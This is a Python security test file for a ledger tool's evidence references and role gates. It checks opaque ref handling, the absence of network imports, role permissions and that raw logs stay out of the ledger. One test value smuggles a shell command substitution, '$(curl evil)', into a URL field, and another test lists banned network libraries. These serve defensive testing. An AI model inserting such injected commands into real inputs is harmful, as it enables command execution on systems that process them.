"""Security tests for P-evidence opaque refs and role gates (§PE.10)."""

from __future__ import annotations

import inspect
import json

from cli.kit_root import kit_root
from tests.fixtures.p_evidence import load_p_evidence_entry, seed_p_evidence_repo
from tests.support import git_status_runner, run_cli
from tools.honesty.ledger import append_entry
from tools.honesty.status import HonestyStatusOptions, run_honesty_status
from tools.honesty.types import LedgerAppendOptions


def test_url_like_ref_treated_as_opaque_string(repo_root) -> None:
    config = seed_p_evidence_repo(repo_root)
    body = load_p_evidence_entry("verification-evidence-pass.json")
    body["artifacts"] = [
        {
            "type": "deploy_health",
            "sha256": "e" * 64,
            "ref": "https://example.com/health?token=$(curl evil)",
        }
    ]
    code = append_entry(
        config=config,
        repo_root=repo_root,
        options=LedgerAppendOptions(kind="verification_evidence", body=body),
    ).exit_code
    assert code == 0


def test_no_network_imports_on_append_verify_match_paths() -> None:
    import tools.honesty.ledger as ledger_mod
    import tools.honesty.status as status_mod
    import tools.honesty.validate as validate_mod

    for module in (ledger_mod, status_mod, validate_mod):
        source = inspect.getsource(module)
        assert "urllib" not in source
        assert "requests" not in source
        assert "httpx" not in source


def test_producer_cannot_append_verification_evidence(repo_root) -> None:
    config = seed_p_evidence_repo(repo_root)
    body = load_p_evidence_entry("verification-evidence-producer.json")
    result = append_entry(
        config=config,
        repo_root=repo_root,
        options=LedgerAppendOptions(kind="verification_evidence", body=body),
    )
    assert result.exit_code == 23


def test_ledger_lines_hashes_only_no_raw_payload(tmp_path) -> None:
    seed_p_evidence_repo(tmp_path)
    body = load_p_evidence_entry("verification-evidence-pass.json")
    body["artifacts"][0]["ref"] = "logs/full-test-output.log"
    payload = tmp_path / "payload.json"
    payload.write_text(json.dumps(body), encoding="utf-8")
    log = tmp_path / "logs"
    log.mkdir()
    secret_log = "SECRET_LOG_PAYLOAD_SHOULD_NOT_APPEAR"
    (log / "full-test-output.log").write_text(secret_log, encoding="utf-8")
    assert run_cli(
        ["ledger", "append", "--kind", "verification_evidence", "--file", "payload.json"],
        cwd=tmp_path,
        runner=git_status_runner(),
        kit=kit_root(),
    ) == 0
    ledger_text = (tmp_path / ".overseer" / "honesty" / "VERDICT-LEDGER.jsonl").read_text(encoding="utf-8")
    assert secret_log not in ledger_text


def test_exit_33_not_waived_when_require_configured(repo_root) -> None:
    config = seed_p_evidence_repo(repo_root, require_verification_evidence="require")
    result = run_honesty_status(
        config=config,
        repo_root=repo_root,
        options=HonestyStatusOptions(
            hook=None,
            artifact=None,
            verification_evidence="Track P / P-evidence",
        ),
    )
    assert result.exit_code == 33
